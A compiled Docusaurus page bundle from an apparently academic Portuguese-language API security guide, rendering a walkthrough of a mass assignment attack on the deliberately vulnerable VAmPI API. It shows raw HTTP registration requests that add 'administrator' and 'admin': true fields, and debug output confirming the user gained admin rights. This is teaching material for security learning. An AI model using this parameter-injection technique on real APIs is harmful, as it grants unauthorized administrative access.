"use strict";(self.webpackChunkapi_security_basic_guide=self.webpackChunkapi_security_basic_guide||[]).push([[711],{3905:(e,n,a)=>{a.d(n,{Zo:()=>p,kt:()=>c});var s=a(7294);function o(e,n,a){return n in e?Object.defineProperty(e,n,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[n]=a,e}function t(e,n){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);n&&(s=s.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),a.push.apply(a,s)}return a}function r(e){for(var n=1;n<arguments.length;n++){var a=null!=arguments[n]?arguments[n]:{};n%2?t(Object(a),!0).forEach((function(n){o(e,n,a[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):t(Object(a)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(a,n))}))}return e}function i(e,n){if(null==e)return{};var a,s,o=function(e,n){if(null==e)return{};var a,s,o={},t=Object.keys(e);for(s=0;s<t.length;s++)a=t[s],n.indexOf(a)>=0||(o[a]=e[a]);return o}(e,n);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);for(s=0;s<t.length;s++)a=t[s],n.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(o[a]=e[a])}return o}var m=s.createContext({}),u=function(e){var n=s.useContext(m),a=n;return e&&(a="function"==typeof e?e(n):r(r({},n),e)),a},p=function(e){var n=u(e.components);return s.createElement(m.Provider,{value:n},e.children)},l={inlineCode:"code",wrapper:function(e){var n=e.children;return s.createElement(s.Fragment,{},n)}},d=s.forwardRef((function(e,n){var a=e.components,o=e.mdxType,t=e.originalType,m=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=u(a),c=o,g=d["".concat(m,".").concat(c)]||d[c]||l[c]||t;return a?s.createElement(g,r(r({ref:n},p),{},{components:a})):s.createElement(g,r({ref:n},p))}));function c(e,n){var a=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var t=a.length,r=new Array(t);r[0]=d;var i={};for(var m in n)hasOwnProperty.call(n,m)&&(i[m]=n[m]);i.originalType=e,i.mdxType="string"==typeof e?e:o,r[1]=i;for(var u=2;u<t;u++)r[u]=a[u];return s.createElement.apply(null,r)}return s.createElement.apply(null,a)}d.displayName="MDXCreateElement"},780:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>m,contentTitle:()=>r,default:()=>l,frontMatter:()=>t,metadata:()=>i,toc:()=>u});var s=a(7462),o=(a(7294),a(3905));const t={sidebar_position:2},r="Explora\xe7\xe3o",i={unversionedId:"Vulnerabilidades/Mass Assignment/exploracao",id:"Vulnerabilidades/Mass Assignment/exploracao",title:"Explora\xe7\xe3o",description:"---",source:"@site/docs/Vulnerabilidades/Mass Assignment/exploracao.md",sourceDirName:"Vulnerabilidades/Mass Assignment",slug:"/Vulnerabilidades/Mass Assignment/exploracao",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Mass Assignment/exploracao",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"defaultSidebar",previous:{title:"Descri\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Mass Assignment/descricao"},next:{title:"Corre\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Mass Assignment/correcao"}},m={},u=[{value:"Registro de um novo usu\xe1rio na aplica\xe7\xe3o",id:"registro-de-um-novo-usu\xe1rio-na-aplica\xe7\xe3o",level:2},{value:"Cria\xe7\xe3o de um usu\xe1rio com permiss\xf5es de administrador",id:"cria\xe7\xe3o-de-um-usu\xe1rio-com-permiss\xf5es-de-administrador",level:2},{value:"Mais refer\xeancias dispon\xedveis na OWASP.",id:"mais-refer\xeancias-dispon\xedveis-na-owasp",level:4}],p={toc:u};function l(e){let{components:n,...a}=e;return(0,o.kt)("wrapper",(0,s.Z)({},p,a,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"explora\xe7\xe3o"},"Explora\xe7\xe3o"),(0,o.kt)("hr",null),(0,o.kt)("p",null,"Tendo em mente os questionamentos levantados ao final da sess\xe3o anterior, \xe9 poss\xedvel realizar os testes de seguran\xe7a a fim de descobrir onde a vulnerabilidade pode ser explorada."),(0,o.kt)("h2",{id:"registro-de-um-novo-usu\xe1rio-na-aplica\xe7\xe3o"},"Registro de um novo usu\xe1rio na aplica\xe7\xe3o"),(0,o.kt)("p",null,"Um usu\xe1rio pode se registrar na aplica\xe7\xe3o usando a rota ",(0,o.kt)("inlineCode",{parentName:"p"},"/users/v1/register"),", sendo necess\xe1rio apenas tr\xeas informa\xe7\xf5es: ",(0,o.kt)("strong",{parentName:"p"},"Username"),", ",(0,o.kt)("strong",{parentName:"p"},"Password")," e ",(0,o.kt)("strong",{parentName:"p"},"email")," no body da requisi\xe7\xe3o."),(0,o.kt)("p",null,"Ser\xe1 criado um usu\xe1rio de teste, chamado ",(0,o.kt)("strong",{parentName:"p"},"UserMass"),", como \xe9 poss\xedvel ver na requisi\xe7\xe3o abaixo."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request de registro de novo usu\xe1rio na aplica\xe7\xe3o"',title:'"Request',de:!0,registro:!0,novo:!0,"usu\xe1rio":!0,na:!0,'aplica\xe7\xe3o"':!0},'POST /users/v1/register HTTP/1.1\nContent-Type: application/json\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: 6396ecee-4f4d-470f-9911-e88eb8bc80b2\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 108\n\n{\n    "username": "UserMass",\n    "password": "strongpassword",\n    "email": "UserMass@massassignment.com"\n}\n')),(0,o.kt)("p",null,"Na response, houve a confirma\xe7\xe3o que o usu\xe1rio foi criado com sucesso."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Response de confirma\xe7\xe3o de registro de novo usu\xe1rio"',title:'"Response',de:!0,"confirma\xe7\xe3o":!0,registro:!0,novo:!0,'usu\xe1rio"':!0},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 92\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sun, 29 Jan 2023 15:02:14 GMT\n\n{\n    "message": "Successfully registered. Login to receive an auth token.",\n    "status": "success"\n}\n')),(0,o.kt)("h2",{id:"cria\xe7\xe3o-de-um-usu\xe1rio-com-permiss\xf5es-de-administrador"},"Cria\xe7\xe3o de um usu\xe1rio com permiss\xf5es de administrador"),(0,o.kt)("p",null,"Ap\xf3s realizar o fluxo comum de cria\xe7\xe3o de um novo usu\xe1rio \xe9 poss\xedvel analisar alguns pontos para iniciar a tentativa de explora\xe7\xe3o:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Os par\xe2metros possuem um padr\xe3o, possuem todas as letras em min\xfasculo"),(0,o.kt)("li",{parentName:"ul"},"Os nomes dos par\xe2metros s\xe3o escritos de forma comum"),(0,o.kt)("li",{parentName:"ul"},"O comportamento da aplica\xe7\xe3o \xe9 similar ao padr\xe3o de outras apis")),(0,o.kt)("p",null,"Com essas informa\xe7\xf5es em mente, \xe9 poss\xedvel testar alguns par\xe2metros comuns:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"administrator"),(0,o.kt)("li",{parentName:"ul"},"admin"),(0,o.kt)("li",{parentName:"ul"},"true ou 1 para indicar que o usu\xe1rio possui a permiss\xe3o")),(0,o.kt)("p",null,"Para testar \xe9 simples, basta adicionar o novo par\xe2metro no body da requisi\xe7\xe3o de registro de um novo usu\xe1rio, ser\xe1 criado o usu\xe1rio ",(0,o.kt)("strong",{parentName:"p"},"TestAdministrator"),", a fim de testar o par\xe2metro ",(0,o.kt)("em",{parentName:"p"},"administrator"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request de registro de usu\xe1rio com par\xe2metro malicioso administrator"',title:'"Request',de:!0,registro:!0,"usu\xe1rio":!0,com:!0,"par\xe2metro":!0,malicioso:!0,'administrator"':!0},'POST /users/v1/register HTTP/1.1\nContent-Type: application/json\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: cc8f3529-22ab-4512-8303-420682ef3a43\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 148\n\n{\n    "username": "TestAdministrator",\n    "password": "adminpass",\n    "email": "TestAdministrator@massassignment.com",\n    "administrator": true\n}\n')),(0,o.kt)("p",null,"A respota obtida foi uma confirma\xe7\xe3o que o usu\xe1rio foi adicionado."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Response de registro de usu\xe1rio com par\xe2metro malicioso administrator"',title:'"Response',de:!0,registro:!0,"usu\xe1rio":!0,com:!0,"par\xe2metro":!0,malicioso:!0,'administrator"':!0},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 92\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sun, 29 Jan 2023 15:12:50 GMT\n\n{\n    "message": "Successfully registered. Login to receive an auth token.",\n    "status": "success"\n}\n')),(0,o.kt)("p",null,"Em uma aplica\xe7\xe3o completa, seria poss\xedvel validar se a permiss\xe3o de administrador foi concedida ao utilizar a plataforma e notar novas funcionalidades, por\xe9m, na VAmPI \xe9 poss\xedvel consultar se um usu\xe1rio possui a permiss\xe3o de administrador usando o endpoint de debug ",(0,o.kt)("inlineCode",{parentName:"p"},"/users/v1/_debug"),"."),(0,o.kt)("p",null,"Ent\xe3o foi poss\xedvel notar que o usu\xe1rio ",(0,o.kt)("strong",{parentName:"p"},"TestAdministrator")," foi criado, mas n\xe3o \xe9 administrador."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json",metastring:'title="Detalhes do usu\xe1rio TestAdministrator"',title:'"Detalhes',do:!0,"usu\xe1rio":!0,'TestAdministrator"':!0},'    {\n        "admin": false,\n        "email": "TestAdministrator@massassignment.com",\n        "password": "adminpass",\n        "username": "TestAdministrator"\n    }\n')),(0,o.kt)("p",null,"Com o par\xe2metro ",(0,o.kt)("em",{parentName:"p"},"administrator")," n\xe3o foi poss\xedvel criar um usu\xe1rio com esse tipo de permiss\xe3o, mas ainda \xe9 poss\xedvel testar outros tipos de combina\xe7\xf5es, sendo ",(0,o.kt)("strong",{parentName:"p"},"admin")," a mais popular."),(0,o.kt)("p",null,"Dessa vez, ser\xe1 feito o registro do usu\xe1rio ",(0,o.kt)("strong",{parentName:"p"},"AdminMassAssignment")," usando o par\xe2metro ",(0,o.kt)("strong",{parentName:"p"},"admin"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request de registro do usu\xe1rio AdminMassAssignment"',title:'"Request',de:!0,registro:!0,do:!0,"usu\xe1rio":!0,'AdminMassAssignment"':!0},'POST /users/v1/register HTTP/1.1\nContent-Type: application/json\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: adefdd58-8c25-47a8-9db4-fabe8fb041fe\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 130\n\n{\n    "username": "AdminMassAssignment",\n    "password": "adminpass",\n    "email": "admin@massassignment.com",\n    "admin": true\n}\n')),(0,o.kt)("p",null,"A respota obtida foi uma confirma\xe7\xe3o que o usu\xe1rio foi adicionado."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Response de registro de usu\xe1rio com par\xe2metro malicioso admin"',title:'"Response',de:!0,registro:!0,"usu\xe1rio":!0,com:!0,"par\xe2metro":!0,malicioso:!0,'admin"':!0},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 92\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sun, 29 Jan 2023 15:30:24 GMT\n\n{\n    "message": "Successfully registered. Login to receive an auth token.",\n    "status": "success"\n}\n')),(0,o.kt)("p",null,"Agora, \xe9 hora de consultar se o usu\xe1rio ",(0,o.kt)("strong",{parentName:"p"},"AdminMassAssignment")," foi criado com permiss\xf5es de administra\xe7\xe3o."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'    {\n        "admin": true,\n        "email": "admin@massassignment.com",\n        "password": "adminpass",\n        "username": "AdminMassAssignment"\n    }\n')),(0,o.kt)("p",null,"E a resposta \xe9: Sim. O usu\xe1rio foi criado com permiss\xf5es de administrador, burlando qualquer regra de neg\xf3cio, bastando adicionar apenas um par\xe2metro facilmente adivinh\xe1vel no body da requisi\xe7\xe3o."),(0,o.kt)("p",null,"Dessa forma, \xe9 poss\xedvel criar infinitos usu\xe1rios com permiss\xe3o de administra\xe7\xe3o nessa aplica\xe7\xe3o, fazendo uma atribui\xe7\xe3o em massa."),(0,o.kt)("h4",{id:"mais-refer\xeancias-dispon\xedveis-na-owasp"},"Mais refer\xeancias dispon\xedveis na ",(0,o.kt)("a",{parentName:"h4",href:"https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.md"},"OWASP"),"."))}l.isMDXComponent=!0}}]);